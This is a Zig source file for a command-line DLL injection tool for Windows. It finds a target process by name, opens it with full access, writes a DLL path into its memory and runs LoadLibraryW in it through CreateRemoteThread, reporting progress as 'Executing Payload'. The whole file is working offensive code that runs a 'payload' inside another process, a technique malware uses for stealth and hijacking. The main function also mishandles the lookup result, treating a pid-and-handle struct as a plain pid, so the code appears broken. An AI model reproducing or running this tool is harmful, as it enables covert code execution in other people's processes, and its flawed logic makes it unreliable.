const std = @import("std");
const windows = std.os.windows;
const print = std.debug.print;

// Windows API types
const HANDLE = windows.HANDLE;
const DWORD = windows.DWORD;
const BOOL = windows.BOOL;
const LPVOID = *anyopaque;
const LPCWSTR = [*:0]const u16;
const SIZE_T = usize;

// Process access rights
const PROCESS_ALL_ACCESS = 0x001F0FFF;
const PROCESS_CREATE_THREAD = 0x0002;
const PROCESS_QUERY_INFORMATION = 0x0400;
const PROCESS_VM_OPERATION = 0x0008;
const PROCESS_VM_WRITE = 0x0020;
const PROCESS_VM_READ = 0x0010;

// Memory allocation constants
const MEM_COMMIT = 0x1000;
const MEM_RESERVE = 0x2000;
const PAGE_READWRITE = 0x04;

// Snapshot constants
const TH32CS_SNAPPROCESS = 0x00000002;
const INVALID_HANDLE_VALUE = @as(windows.HANDLE, @ptrFromInt(std.math.maxInt(usize)));

// Process entry structure
const PROCESSENTRY32W = extern struct {
    dwSize: DWORD,
    cntUsage: DWORD,
    th32ProcessID: DWORD,
    th32DefaultHeapID: usize,
    th32ModuleID: DWORD,
    cntThreads: DWORD,
    th32ParentProcessID: DWORD,
    pcPriClassBase: i32,
    dwFlags: DWORD,
    szExeFile: [260]u16,
};

// Windows API function declarations
extern "kernel32" fn CreateToolhelp32Snapshot(dwFlags: DWORD, th32ProcessID: DWORD) callconv(.C) HANDLE;
extern "kernel32" fn Process32FirstW(hSnapshot: HANDLE, lppe: *PROCESSENTRY32W) callconv(.C) BOOL;
extern "kernel32" fn Process32NextW(hSnapshot: HANDLE, lppe: *PROCESSENTRY32W) callconv(.C) BOOL;
extern "kernel32" fn OpenProcess(dwDesiredAccess: DWORD, bInheritHandle: BOOL, dwProcessId: DWORD) callconv(.C) ?HANDLE;
extern "kernel32" fn GetModuleHandleW(?LPCWSTR) callconv(.C) ?windows.HMODULE;
extern "kernel32" fn GetProcAddress(windows.HMODULE, [*:0]const u8) callconv(.C) ?*anyopaque;
extern "kernel32" fn VirtualAllocEx(HANDLE, ?LPVOID, SIZE_T, DWORD, DWORD) callconv(.C) ?LPVOID;
extern "kernel32" fn WriteProcessMemory(HANDLE, LPVOID, ?*const anyopaque, SIZE_T, ?*SIZE_T) callconv(.C) BOOL;
extern "kernel32" fn CreateRemoteThread(HANDLE, ?*anyopaque, SIZE_T, *const fn (?LPVOID) callconv(.C) DWORD, ?LPVOID, DWORD, ?*DWORD) callconv(.C) ?HANDLE;
extern "kernel32" fn CloseHandle(HANDLE) callconv(.C) BOOL;
extern "kernel32" fn GetLastError() callconv(.C) DWORD;

// Helper function to wait for Enter key
fn waitForEnter(message: []const u8) void {
    print("{s}", .{message});
    var buffer: [256]u8 = undefined;
    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\n') catch {};
}

// Convert UTF-8 string to wide string
fn convertToWideString(allocator: std.mem.Allocator, utf8_str: []const u8) ![:0]u16 {
    return try std.unicode.utf8ToUtf16LeAllocZ(allocator, utf8_str);
}

// Compare wide strings (case-insensitive)
fn compareWideStringsIgnoreCase(str1: []const u16, str2: []const u16) bool {
    if (str1.len != str2.len) return false;

    for (str1, str2) |c1, c2| {
        var lower_c1 = c1;
        var lower_c2 = c2;

        // Convert to lowercase
        if (c1 >= 'A' and c1 <= 'Z') lower_c1 = c1 + ('a' - 'A');
        if (c2 >= 'A' and c2 <= 'Z') lower_c2 = c2 + ('a' - 'A');

        if (lower_c1 != lower_c2) return false;
    }
    return true;
}

// Get remote process handle by name
fn getRemoteProcessHandle(allocator: std.mem.Allocator, process_name: []const u8) !struct { pid: DWORD, handle: HANDLE } {
    const wide_process_name = try convertToWideString(allocator, process_name);
    defer allocator.free(wide_process_name);

    print("[i] Searching For Process Id Of \"{s}\" ... ", .{process_name});

    const snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        print("[!] CreateToolhelp32Snapshot Failed With Error : {d} \n", .{GetLastError()});
        return error.SnapshotFailed;
    }
    defer _ = CloseHandle(snapshot);

    var process_entry = PROCESSENTRY32W{
        .dwSize = @sizeOf(PROCESSENTRY32W),
        .cntUsage = 0,
        .th32ProcessID = 0,
        .th32DefaultHeapID = 0,
        .th32ModuleID = 0,
        .cntThreads = 0,
        .th32ParentProcessID = 0,
        .pcPriClassBase = 0,
        .dwFlags = 0,
        .szExeFile = std.mem.zeroes([260]u16),
    };

    if (Process32FirstW(snapshot, &process_entry) == 0) {
        print("[!] Process32FirstW Failed With Error : {d} \n", .{GetLastError()});
        return error.ProcessEnumFailed;
    }

    while (true) {
        var exe_name_len: usize = 0;
        while (exe_name_len < process_entry.szExeFile.len and process_entry.szExeFile[exe_name_len] != 0) {
            exe_name_len += 1;
        }

        const exe_name = process_entry.szExeFile[0..exe_name_len];

        if (compareWideStringsIgnoreCase(exe_name, wide_process_name)) {
            print("[+] DONE \n", .{});
            print("[i] Found Target Process Pid: {d} \n", .{process_entry.th32ProcessID});

            const handle = OpenProcess(PROCESS_ALL_ACCESS, 0, process_entry.th32ProcessID) orelse {
                print("[!] OpenProcess Failed With Error : {d} \n", .{GetLastError()});
                return error.OpenProcessFailed;
            };

            return .{ .pid = process_entry.th32ProcessID, .handle = handle };
        }

        if (Process32NextW(snapshot, &process_entry) == 0) {
            break;
        }
    }

    print("[!] Process is Not Found \n", .{});
    return error.ProcessNotFound;
}

// Get wide string length in bytes (including null terminator)
fn getWideStringByteLength(wide_str: LPCWSTR) DWORD {
    var len: DWORD = 0;
    const ptr = wide_str;
    while (ptr[len] != 0) {
        len += 1;
    }
    return (len + 1) * @sizeOf(u16); // Include null terminator
}

// Main DLL injection function
fn injectDllToRemoteProcess(h_process: HANDLE, dll_name: LPCWSTR) BOOL {
    var h_thread: ?HANDLE = null;
    defer {
        if (h_thread) |thread| {
            _ = CloseHandle(thread);
        }
    }

    // Calculate the size of DllName in bytes
    const dw_size_to_write = getWideStringByteLength(dll_name);
    var lp_number_of_bytes_written: SIZE_T = 0;

    // Get the address of LoadLibraryW from kernel32.dll
    const kernel32_handle = GetModuleHandleW(std.unicode.utf8ToUtf16LeStringLiteral("kernel32.dll")) orelse {
        print("[!] GetModuleHandleW Failed With Error: {d}\n", .{GetLastError()});
        return 0;
    };

    const p_load_library_w = GetProcAddress(kernel32_handle, "LoadLibraryW") orelse {
        print("[!] GetProcAddress Failed With Error: {d}\n", .{GetLastError()});
        return 0;
    };

    // Allocate memory in the remote process
    const p_address = VirtualAllocEx(
        h_process,
        null,
        dw_size_to_write,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    ) orelse {
        print("[!] VirtualAllocEx Failed With Error: {d}\n", .{GetLastError()});
        return 0;
    };

    print("[i] pAddress Allocated At : 0x{x} Of Size : {d}\n", .{ @intFromPtr(p_address), dw_size_to_write });
    waitForEnter("[#] Press <Enter> To Write ... ");

    // Write the DLL name to the remote process memory
    const write_result = WriteProcessMemory(
        h_process,
        p_address,
        dll_name,
        dw_size_to_write,
        &lp_number_of_bytes_written,
    );

    if (write_result == 0 or lp_number_of_bytes_written != dw_size_to_write) {
        print("[!] WriteProcessMemory Failed With Error: {d}\n", .{GetLastError()});
        print("[!] Expected to write: {d} bytes, actually wrote: {d} bytes\n", .{ dw_size_to_write, lp_number_of_bytes_written });
        return 0;
    }

    print("[i] Successfully Written {d} Bytes\n", .{lp_number_of_bytes_written});
    waitForEnter("[#] Press <Enter> To Run ... ");

    print("[i] Executing Payload ... \n", .{});

    // Create a remote thread to execute LoadLibraryW with our DLL path
    h_thread = CreateRemoteThread(
        h_process,
        null,
        0,
        @ptrCast(p_load_library_w),
        p_address,
        0,
        null,
    ) orelse {
        print("[!] CreateRemoteThread Failed With Error: {d}\n", .{GetLastError()});
        return 0;
    };

    print("[+] DONE!\n", .{});
    print("[+] DLL Injection Completed Successfully!\n", .{});

    return 1; // TRUE
}

// Print usage information
fn printUsage(program_name: []const u8) void {
    print("[!] Usage : \"{s}\" <Complete DLL Payload Path> <Process Name>\n", .{program_name});
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const args = try std.process.argsAlloc(allocator);
    defer std.process.argsFree(allocator, args);

    if (args.len != 3) {
        printUsage(args[0]);
        std.process.exit(1);
    }

    const dll_path = args[1];
    const process_name = args[2];

    // Find target process
    const target_pid = try getRemoteProcessHandle(allocator, process_name) orelse {
        print("[!] Failed to find process: {s}\n", .{process_name});
        print("[!] Make sure the process is running and try again.\n", .{});
        std.process.exit(1);
    };

    // Open target process
    const target_process = OpenProcess(
        PROCESS_ALL_ACCESS,
        0, // bInheritHandle = FALSE
        target_pid,
    ) orelse {
        print("[!] OpenProcess Failed With Error: {d}\n", .{GetLastError()});
        print("[!] Try running as Administrator or check process permissions.\n", .{});
        std.process.exit(1);
    };
    defer _ = CloseHandle(target_process);

    // Convert DLL path to wide string
    const wide_dll_path = try convertToWideString(allocator, dll_path);
    defer allocator.free(wide_dll_path);

    // Inject DLL
    const injection_result = injectDllToRemoteProcess(target_process, wide_dll_path.ptr);

    if (injection_result == 1) {
        print("\n", .{});
        print("SUCCESS! DLL injection completed successfully!\n", .{});
        print("Your payload should now be running in the target process!\n", .{});
    } else {
        print("\n", .{});
        print("FAILED! DLL injection was not successful.\n", .{});
        print("Check the error messages above for details.\n", .{});
        std.process.exit(1);
    }

    waitForEnter("\n[#] Press <Enter> To Exit ... ");
}
